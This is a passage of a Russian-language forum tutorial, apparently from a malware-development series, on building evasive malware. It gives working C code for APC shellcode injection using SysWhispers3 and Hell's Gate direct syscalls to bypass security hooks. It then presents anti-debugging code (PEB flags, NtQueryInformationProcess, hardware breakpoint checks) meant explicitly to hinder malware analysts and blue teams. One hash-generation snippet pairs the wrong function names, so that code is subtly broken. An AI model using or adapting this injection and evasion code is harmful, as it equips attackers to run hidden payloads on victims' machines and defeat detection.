//--------------------------------------------------------------------------

// Запись полезной нагрузки
printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
getchar();
printf(&quot;\t[i] Writing Payload Of Size %d ... &quot;, sPayloadSize);
if ((STATUS = St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
    printf(&quot;[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
    printf(&quot;[i] Bytes Written : %d of %d \n&quot;, sNumberOfBytesWritten, sPayloadSize);
    return FALSE;
}
printf(&quot;[+] DONE \n&quot;);
//--------------------------------------------------------------------------

// Изменение разрешений памяти на RWX
if ((STATUS = St.pNtProtectVirtualMemory(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
    printf(&quot;[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
    return FALSE;
}
//--------------------------------------------------------------------------

// Выполнение полезной нагрузки с помощью NtQueueApcThread

printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
getchar();
printf(&quot;\t[i] Running Payload At 0x%p Using Thread Of Id : %d ... &quot;, pAddress, GetThreadId(hThread));
if ((STATUS = St.pNtQueueApcThread(hThread, pAddress, NULL, NULL, NULL)) != 0) {
    printf(&quot;[!] NtQueueApcThread Failed With Error : 0x%0.8X \n&quot;, STATUS);
    return FALSE;
}
printf(&quot;[+] DONE \n&quot;);

return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Реализация с использованием SysWhispers</b><br />
<br />
Здесь реализация использует SysWhispers3 для обхода пользовательских хуков через прямые системные вызовы. Для этой реализации используется следующая команда для создания необходимых файлов.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>python syswhispers.py -a x64 -c msvc -m jumper_randomized -f NtAllocateVirtualMemory,NtProtectVirtualMemory,NtWriteVirtualMemory,NtQueueApcThread -o SysWhispers -v</code></pre>
	</div>
</div><br />
Генерируются три файла: SysWhispers.h, SysWhispers.c и SysWhispers-asm.x64.asm.<br />
Следующим шагом является импорт этих файлов в Visual Studio, как было продемонстрировано ранее. Функция ApcInjectionViaSyscalls приведена ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL ApcInjectionViaSyscalls(IN HANDLE hProcess, IN HANDLE hThread, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

Syscall     St                      = { 0 };
NTSTATUS    STATUS                  = NULL;
PVOID       pAddress                = NULL;
ULONG       uOldProtection          = NULL;
SIZE_T      sSize                   = sPayloadSize,
            sNumberOfBytesWritten   = NULL;

// Выделение памяти
if ((STATUS = NtAllocateVirtualMemory(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
    printf(&quot;[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
    return FALSE;
}
printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sSize);
//--------------------------------------------------------------------------

// Запись полезной нагрузки
printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
getchar();
printf(&quot;\t[i] Writing Payload Of Size %d ... &quot;, sPayloadSize);
if ((STATUS = NtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
    printf(&quot;[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
    printf(&quot;[i] Bytes Written : %d of %d \n&quot;, sNumberOfBytesWritten, sPayloadSize);
    return FALSE;
}
printf(&quot;[+] DONE \n&quot;);
//--------------------------------------------------------------------------

// Изменение разрешений памяти на RWX
if ((STATUS = NtProtectVirtualMemory(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
    printf(&quot;[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
    return FALSE;
}
//--------------------------------------------------------------------------

// Выполнение полезной нагрузки с помощью NtQueueApcThread

printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
getchar();
printf(&quot;\t[i] Running Payload At 0x%p Using Thread Of Id : %d ... &quot;, pAddress, GetThreadId(hThread));
if ((STATUS = NtQueueApcThread(hThread, pAddress, NULL, NULL, NULL)) != 0) {
    printf(&quot;[!] NtQueueApcThread Failed With Error : 0x%0.8X \n&quot;, STATUS);
    return FALSE;
}
printf(&quot;[+] DONE \n&quot;);

return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Реализация с использованием Hell&#039;s Gate</b><br />
<br />
Последняя реализация для этого модуля использует Hell&#039;s Gate. Сначала убедитесь, что здесь выполняются те же шаги, что и для настройки проекта Visual Studio с SysWhispers3. В частности, включение MASM и изменение свойств для компиляции файла ASM с использованием Microsoft Macro Assembler.<br />
<br />
<b>Обновление структуры VX_TABLE</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _VX_TABLE {
VX_TABLE_ENTRY NtAllocateVirtualMemory;
VX_TABLE_ENTRY NtWriteVirtualMemory;
VX_TABLE_ENTRY NtProtectVirtualMemory;
VX_TABLE_ENTRY NtQueueApcThread;
} VX_TABLE, * PVX_TABLE;</code></pre>
	</div>
</div><br />
<b>Обновление значения начального числа (seed)</b><br />
<br />
Для <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L93" target="_blank" class="link link--external" rel="noopener">замены старого значения</a> начального числа будет использоваться новое значение, чтобы изменить хэш-значения системных вызовов. Функция хеширования djb2 обновляется новым значением начального числа, как показано ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>DWORD64 djb2(PBYTE str) {
    DWORD64 dwHash = 0x77347734DEADBEEF; // Old value: 0x7734773477347734
    INT c;

    while (c = *str++)
        dwHash = ((dwHash &lt;&lt; 0x5) + dwHash) + c;

    return dwHash;
}</code></pre>
	</div>
</div><br />
Следующие операторы printf должны быть добавлены в новый проект для генерации хэш-значений djb2 (По аналогии с примерами выше, напишите консольную программу).<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtAllocateVirtualMemory&quot;, &quot;_djb2&quot;, (DWORD64)djb2(&quot;NtCreateSection&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtWriteVirtualMemory&quot;, &quot;_djb2&quot;, djb2(&quot;NtMapViewOfSection&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtProtectVirtualMemory&quot;, &quot;_djb2&quot;, djb2(&quot;NtUnmapViewOfSection&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtQueueApcThread&quot;, &quot;_djb2&quot;, djb2(&quot;NtClose&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtCreateThreadEx&quot;, &quot;_djb2&quot;, djb2(&quot;NtCreateThreadEx&quot;));</code></pre>
	</div>
</div><br />
После генерации значений добавьте их в начало проекта Hell&#039;s Gate.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>#define NtAllocateVirtualMemory_djb2 0x7B2D1D431C81F5F6
#define NtWriteVirtualMemory_djb2    0x54AEE238645CCA7C
#define NtProtectVirtualMemory_djb2  0xA0DCC2851566E832
#define NtQueueApcThread_djb2        0x331E6B6B7E696022</code></pre>
	</div>
</div><br />
<b>Функция ApcInjectionViaSyscalls</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>BOOL ApcInjectionViaSyscalls(IN PVX_TABLE pVxTable, IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

    Syscall     St                      = { 0 };
    NTSTATUS    STATUS                  = NULL;
    PVOID       pAddress                = NULL;
    ULONG       uOldProtection          = NULL;
    SIZE_T      sSize                   = sPayloadSize,
                sNumberOfBytesWritten   = NULL;

    // Allocating memory
    HellsGate(pVxTable-&gt;NtAllocateVirtualMemory.wSystemCall);
    if ((STATUS = HellDescent(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
        printf(&quot;[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sSize);

//--------------------------------------------------------------------------

    // Writing the payload
    printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
    getchar();
    printf(&quot;\t[i] Writing Payload Of Size %d ... &quot;, sPayloadSize);
    HellsGate(pVxTable-&gt;NtWriteVirtualMemory.wSystemCall);
    if ((STATUS = HellDescent(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
        printf(&quot;[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        printf(&quot;[i] Bytes Written : %d of %d \n&quot;, sNumberOfBytesWritten, sPayloadSize);
        return FALSE;
    }
    printf(&quot;[+] DONE \n&quot;);

//--------------------------------------------------------------------------

    // Changing the memory&#039;s permissions to RWX
    HellsGate(pVxTable-&gt;NtProtectVirtualMemory.wSystemCall);
    if ((STATUS = HellDescent(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
        printf(&quot;[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

//--------------------------------------------------------------------------

    // Executing the payload via NtQueueApcThread

    printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
    getchar();
    printf(&quot;\t[i] Running Payload At 0x%p Using Thread Of Id : %d ... &quot;, pAddress, GetThreadId(hThread));
    HellsGate(pVxTable-&gt;NtQueueApcThread.wSystemCall);
    if ((STATUS = HellDescent(hThread, pAddress, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtQueueApcThread Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] DONE \n&quot;);


    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Удаленная инъекция</b><br />
<br />
Возможно использовать функцию ApcInjectionViaSyscalls для удаленной инъекции в процесс, но для этого необходимо создать приостановленный процесс. Этот подход обсуждался <a href="https://ru-sfera.pw/threads/razrabotka-virusov-19-izuchaem-texniku-apc-injection.4451/" target="_blank" class="link link--external" rel="noopener">здесь</a><br />
<br />
<b>Обновление основной функции</b><br />
<br />
Основную функцию (<a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L49" target="_blank" class="link link--external" rel="noopener">wmain</a>) необходимо обновить для использования функции ApcInjectionViaSyscalls <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L80" target="_blank" class="link link--external" rel="noopener">вместо функции полезной нагрузки.</a><br />
<br />
<b>Демонстрация </b><br />
<br />
Использование реализации с использованием SysWhispers.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786936098.png"
		data-src="https://osint42.org/attachments/1746786936098-png.239/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746786936098-png.239/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786936098.png"
			title="1746786936098.png"
			width="1881" height="916" loading="lazy" />
	</div><br />
<br />
Использование Hell&#039;s Gate<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786944668.png"
		data-src="https://osint42.org/attachments/1746786944668-png.240/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746786944668-png.240/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786944668.png"
			title="1746786944668.png"
			width="1845" height="816" loading="lazy" />
	</div></div>
						

							<h2>Черпаем силы в антиотладке</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746787126106.png"
		data-src="https://osint42.org/attachments/1746787126106-png.241/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787126106-png.241/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787126106.png"
			title="1746787126106.png"
			width="600" height="375" loading="lazy" />
	</div><br />
<br />
Техники антианализа - это методы, предотвращающие деятельность специалистов по безопасности (например, команды blue team) по расследованию вредоносного ПО и поиску статических или динамических сигнатур и IoC. Поскольку эта информация используется для обнаружения образца, когда он вновь обнаруживается в среде.<br />
<br />
Организации с большим бюджетом на безопасность, как правило, имеют больше сотрудников, таких как аналитики вредоносных программ, чтобы собирать данные о подозрительных бинарных файлах, анализируя их. В целом, аналитики вредоносных программ всегда найдут способ декомпилировать вредоносное ПО, <b><u>поэтому цель техник антианализа - усложнить процесс анализа.</u></b><br />
<br />
С другой стороны, организации с меньшим бюджетом на безопасность будут больше полагаться на автоматизированные инструменты, и поэтому техники антианализа могут быть более эффективными в достижении своей цели.<br />
<br />
Рассмотрим инструменты анализа вредоносных программ:<br />
<br />
<b>Песочничные среды</b><br />
<br />
Понимание песочничной среды жизненно важно, если вы хотите применять сильные техники антианализа.<br />
<br />
<b>Песочница</b> - это изолированная среда, позволяющая выполнять программное обеспечение без воздействия на хост-систему. У песочниц есть несколько применений вне контекста безопасности, которые обсуждаться не будут.<br />
<br />
В контексте безопасности песочницы позволяют исследователям безопасности анализировать вредоносное ПО в изолированной среде без ущерба для хоста. Несколько примеров песочниц: Cuckoo Sandbox, Any.run и Crowdstrike Sandbox.<br />
<br />
<b>Анализ через отладку </b><br />
<br />
Отладка кода вредоносного ПО позволяет выполнять его шаг за шагом, наблюдая за изменениями в области памяти, изменениями значений переменных и т. д. Это способствует лучшему пониманию намерений и возможностей вредоносного ПО, упрощая процесс создания правил обнаружения для бинарного файла в вопросе.<br />
<br />
Техники антиотладки можно использовать для обнаружения наличия отладчика и изменения потока выполнения для запуска безвредного ложного кода, делая процесс отладки неэффективным. Кроме того, может быть завершено выполнение текущего кода, чтобы предотвратить отладку.<br />
<br />
<b>Инструменты реверс-инжиниринга</b> <b>вредоносного ПО</b><br />
<br />
Самые популярные инструменты реверс-инжиниринга для вредоносного ПО перечислены ниже:<br />
<br />
<b>Ghidra;<br />
Ida;<br />
xdbg<br />
<br />
Анализ через виртуальные среды</b><br />
<br />
Виртуальные среды - это изолированные среды, предоставляющие виртуализированную среду для работы программных приложений. Виртуализированные среды используются для изолирования процесса отладки и анализа образцов вредоносного ПО, делая его безопаснее для анализа, чем в реальных сетях.<br />
<br />
Песочницы также считаются виртуальной средой, хотя они не позволяют аналитикам вредоносных программ иметь полный доступ к операционной системе, тогда как полноценная виртуальная среда позволяет. Два распространенных программных обеспечения для виртуализации: VMware и VirtualBox.<br />
<br />
Выполнение вредоносного кода в виртуальной среде должно быть избегаемо, так как это позволяет аналитикам вредоносных программ разбирать код и писать правила обнаружения для него.<br />
<br />
Техники против виртуальных сред будет обсуждаться в следующей статье<br />
<br />
<b>Давайте рассмотрим несколько методов анти-отладки:<br />
<br />
Обнаружение отладчиков с использованием IsDebuggerPresent </b><br />
<br />
Один из самых простых методов анти-отладки - использование функции WinAPI IsDebuggerPresent. Эта функция возвращает TRUE, если к вызывающему процессу подключен отладчик, и FALSE, если нет. Ниже приведен фрагмент кода, показывающий использование функции для обнаружения отладчика.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>if (IsDebuggerPresent()) {
  printf(&quot;[i] IsDebuggerPresent обнаружил отладчик \n&quot;);
  // Запустить безопасный код..
}</code></pre>
	</div>
</div><br />
<b>Замена функции IsDebuggerPresent</b><br />
<br />
Вызов функции IsDebuggerPresent WinAPI подозрителен даже в том случае, если он хорошо скрыт через хеширование API. WinAPI считается очень базовым способом обнаружения отладчиков и может быть обойден с помощью инструментов, таких как ScyllaHide, который является плагином для xdbg, предназначенным для обхода анти-отладки.<br />
<br />
Более эффективным подходом является создание пользовательской версии функции IsDebuggerPresent WinAPI. Напомним о структуре PEB (Process Environment Block), которая содержит член BeingDebugged, <b>устанавливаемый в 1, когда процесс находится в режиме отладки. </b><br />
Простая замена функции IsDebuggerPresent WinAPI включает в себя проверку значения BeingDebugged, как показано в пользовательской функции ниже.<br />
<br />
Функция IsDebuggerPresent2 возвращает TRUE, если элемент BeingDebugged установлен в 1.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL IsDebuggerPresent2() {

  // Получение структуры PEB
#ifdef _WIN64
    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));
#endif// Проверка элемента &#039;BeingDebugged&#039;
  if (pPeb-&gt;BeingDebugged == 1)
    return TRUE;

   return FALSE;
}</code></pre>
	</div>
</div><br />
Другой способ создания пользовательской версии функции IsDebuggerPresent WinAPI заключается в использовании неудокументированного флага NtGlobalFlag, который также находится в структуре PEB. Элемент NtGlobalFlag устанавливается в 0x70 (шестнадцатеричное значение), если процесс находится в режиме отладки, в противном случае он равен 0. Важно отметить, что элемент NtGlobalFlag устанавливается в 0x70 только при создании процесса отладчиком. Поэтому этот метод не сможет обнаружить отладчик, если он был подключен после запуска.<br />
<br />
Значение 0x70 происходит из комбинации следующих флагов:<br />
<br />
FLG_HEAP_ENABLE_TAIL_CHECK - 0x10<br />
FLG_HEAP_ENABLE_FREE_CHECK - 0x20<br />
FLG_HEAP_VALIDATE_PARAMETERS - 0x40<br />
<br />
Функция IsDebuggerPresent3 возвращает TRUE, если элемент NtGlobalFlag установлен в 0x70.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define FLG_HEAP_ENABLE_TAIL_CHECK   0x10#define FLG_HEAP_ENABLE_FREE_CHECK   0x20#define FLG_HEAP_VALIDATE_PARAMETERS 0x40

BOOL IsDebuggerPresent3() {

  // Получение структуры PEB
#ifdef _WIN64
    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));
#endif// Проверка элемента &#039;NtGlobalFlag&#039;
  if (pPeb-&gt;NtGlobalFlag == (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS))
    return TRUE;

  return FALSE;
}</code></pre>
	</div>
</div><br />
<b>Обнаружение отладчика с использованием NtQueryInformationProcess</b><br />
<br />
Системный вызов NtQueryInformationProcess будет использоваться для обнаружения отладчиков с помощью двух флагов: ProcessDebugPort и ProcessDebugObjectHandle.<br />
<br />
Напомним, что NtQueryInformationProcess выглядит следующим образом:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtQueryInformationProcess(
  IN    HANDLE           ProcessHandle,               // Дескриптор процесса, для которого необходимо получить информацию.
  IN    PROCESSINFOCLASS ProcessInformationClass,     // Тип запрашиваемой информации о процессе.
  OUT   PVOID            ProcessInformation,          // Указатель на буфер, в который функция записывает запрошенную информацию.
  IN    ULONG            ProcessInformationLength,    // Размер буфера, указанного в параметре &#039;ProcessInformation&#039;.
  OUT   PULONG           ReturnLength                 // Указатель на переменную, в которой функция возвращает размер запрошенной информации.
);</code></pre>
	</div>
</div><br />
<b>Флаг ProcessDebugPort</b><br />
<br />
Документация Microsoft о флаге ProcessDebugPort гласит следующее:<br />
<br />
Получает значение типа DWORD_PTR, которое представляет номер порта отладчика для процесса. Ненулевое значение указывает, что процесс выполняется под управлением отладчика уровня 3.<br />
<br />
Другими словами, если NtQueryInformationProcess возвращает ненулевое значение, полученное через параметр ProcessInformation, то процесс активно отлаживается.<br />
<br />
<b>Флаг ProcessDebugObjectHandle</b><br />
<br />
Неудокументированный флаг ProcessDebugObjectHandle работает аналогично флагу ProcessDebugPort и используется для получения дескриптора объекта отладки текущего процесса, который создается, если процесс находится в режиме отладки.<br />
Если NtQueryInformationProcess не удается получить дескриптор объекта отладки, это означает, что он не обнаружил отладчик, и функция вернет код ошибки 0xC0000353. Согласно документации Microsoft о значениях NTSTATUS, код ошибки эквивалентен STATUS_PORT_NOT_SET.<br />
<br />
<b>Код антиотладки<br />
<br />
NtQueryInformationProcess </b><br />
<br />
Функция NtQIPDebuggerCheck использует как ProcessInformation, так и ProcessDebugObjectHandle для обнаружения отладчиков. Функция возвращает TRUE, если NtQueryInformationProcess возвращает действительный дескриптор, используя оба флага ProcessDebugPort и ProcessDebugObjectHandle.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL NtQIPDebuggerCheck() {

    NTSTATUS                      STATUS                        = NULL;
    fnNtQueryInformationProcess   pNtQueryInformationProcess    = NULL;
    DWORD64                       dwIsDebuggerPresent           = NULL;
    DWORD64                       hProcessDebugObject           = NULL;

    // Получение адреса NtQueryInformationProcess
    pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandle(TEXT(&quot;NTDLL.DLL&quot;)), &quot;NtQueryInformationProcess&quot;);
    if (pNtQueryInformationProcess == NULL) {
        printf(&quot;\t[!] GetProcAddress завершилось с ошибкой: %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Вызов NtQueryInformationProcess с флагом &#039;ProcessDebugPort&#039;
    STATUS = pNtQueryInformationProcess(
        GetCurrentProcess(),
        ProcessDebugPort,
        &amp;dwIsDebuggerPresent,
        sizeof(DWORD64),
        NULL
    );

    if (STATUS != 0x0) {
        printf(&quot;\t[!] NtQueryInformationProcess [1] завершилось с кодом статуса: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // Если NtQueryInformationProcess возвращает ненулевое значение, дескриптор действителен, что означает, что мы находимся в режиме отладки
    if (dwIsDebuggerPresent != NULL) {
        // обнаружен отладчик
        return TRUE;
    }

    // Вызов NtQueryInformationProcess с флагом &#039;ProcessDebugObjectHandle&#039;
    STATUS = pNtQueryInformationProcess(
        GetCurrentProcess(),
        ProcessDebugObjectHandle,
        &amp;hProcessDebugObject,
        sizeof(DWORD64),
        NULL
    );

    // Если STATUS не равен 0 и не равен 0xC0000353 (это &#039;STATUS_PORT_NOT_SET&#039;)
    if (STATUS != 0x0 &amp;&amp; STATUS != 0xC0000353) {
        printf(&quot;\t[!] NtQueryInformationProcess [2] завершилось с кодом статуса: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // Если NtQueryInformationProcess возвращает ненулевое значение, дескриптор действителен, что означает, что мы находимся в режиме отладки
    if (hProcessDebugObject != NULL) {
        // обнаружен отладчик
        return TRUE;
    }

    return FALSE;
}</code></pre>
	</div>
</div><br />
<b>Обнаружение отладчика с использованием аппаратных точек останова</b><br />
<br />
Этот метод действителен только в том случае, если во время отладки установлены аппаратные точки останова. Аппаратные точки останова, также известные как регистры аппаратной отладки, являются функцией современных микропроцессоров, которая приостанавливает выполнение процесса при срабатывании определенного адреса памяти или события. Аппаратные точки останова реализованы в самом процессоре и, следовательно, более быстры и эффективны, чем обычные программные точки останова, которые зависят от операционной системы или отладчика для периодической проверки выполнения программы.<br />
<br />
Когда устанавливаются аппаратные точки останова, изменяются значения определенных регистров. Значения этих регистров можно использовать для определения, подключен ли отладчик к процессу. Если регистры Dr0, Dr1, Dr2 и Dr3 содержат ненулевое значение, то аппаратная точка останова установлена. В следующем примере устанавливается аппаратная точка останова на системный вызов NtAllocateVirtualMemory с использованием отладчика xdbg. Обратите внимание, как значение Dr0 изменяется с нуля на адрес NtAllocateVirtualMemory.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746787144016.png"
		data-src="https://osint42.org/attachments/1746787144016-png.242/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787144016-png.242/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787144016.png"
			title="1746787144016.png"
			width="1784" height="385" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746787150135.png"
		data-src="https://osint42.org/attachments/1746787150135-png.243/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787150135-png.243/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787150135.png"
			title="1746787150135.png"
			width="1136" height="149" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746787155457.png"
		data-src="https://osint42.org/attachments/1746787155457-png.244/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787155457-png.244/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787155457.png"
			title="1746787155457.png"
			width="1740" height="270" loading="lazy" />
	</div><br />
<br />
<b>Получение значений регистров</b><br />
<br />
Для получения значений регистров Dr можно использовать функцию WinAPI GetThreadContext.<br />
Функция возвращает контекст в виде структуры CONTEXT. Эта структура также включает в себя значения регистров Dr0, Dr1, Dr2 и Dr3.<br />
<br />
Функция HardwareBpCheck обнаруживает наличие отладчика путем проверки значений вышеуказанных регистров.<br />
Функция возвращает TRUE, если обнаружен отладчик.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL HardwareBpCheck() {

    CONTEXT        Ctx        = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };

    if (!GetThreadContext(GetCurrentThread(), &amp;Ctx)) {
        printf(&quot;\t[!] GetThreadContext не удалось : %d \n&quot;, GetLastError());
        return FALSE;
    }

    if (Ctx.Dr0 != NULL || Ctx.Dr1 != NULL || Ctx.Dr2 != NULL || Ctx.Dr3 != NULL)
        return TRUE; // Обнаружен отладчик

    return FALSE;
}</code></pre>
	</div>
</div><br />
<b>Обнаружение отладчика с использованием черного списка процессов</b><br />
<br />
